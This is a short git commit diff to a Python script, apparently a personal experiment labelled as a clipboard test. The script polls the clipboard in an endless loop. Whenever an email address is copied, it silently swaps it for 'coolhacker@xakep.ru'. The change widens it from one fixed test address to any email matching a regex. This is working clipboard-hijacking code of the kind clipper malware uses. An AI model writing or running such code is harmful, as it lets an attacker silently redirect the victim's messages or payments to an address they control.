140f2205c850264c14cf3e5f5b51ef3b6f426eba
Shamil <s.aksanof@gmail.com>
2022-10-18 17:33:00 +0500

    Сlipboard_test_2

--- mail_replacing_test.py
+++ mail_replacing_test.py
@@ -1,21 +1,45 @@
 # "cridd@mail.ru" - почтовый адрес для теста по мониторингу буфера
 # обмена и замене содержимого, если скопирован эелектронный адрес
 
+# import pyperclip
+# old = ''
+# new_old = ''
+
+# while True:
+#     s = pyperclip.paste()
+#     if s == "cridd@mail.ru":
+#         pyperclip.copy('coolhacker@xakep.ru')
+#         new_s = pyperclip.paste()
+#         if new_s != s:
+#             print(new_s)
+#             s = new_s
+#             new_old = new_s
+#     else:
+#         if s != old:
+#             if s != new_old:
+#                 print(s)
+#                 old = s
+
+
+
+import re
 import pyperclip
-old = ''
-new_old = ''
+old = ""
+c = re.compile(r'([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})+')
 
 while True:
     s = pyperclip.paste()
-    if s == "cridd@mail.ru":
+    if re.fullmatch(c, s):
         pyperclip.copy('coolhacker@xakep.ru')
-        new_s = pyperclip.paste()
-        if new_s != s:
-            print(new_s)
-            s = new_s
-            new_old = new_s
+        s = pyperclip.paste()
+        if s !=old:
+            print(s)
+            old = s
+            print("парам-пам-пам...")
+        
     else:
         if s != old:
-            if s != new_old:
-                print(s)
-                old = s
+            print(s, "- Это не email")
+        old = s
+        
+    
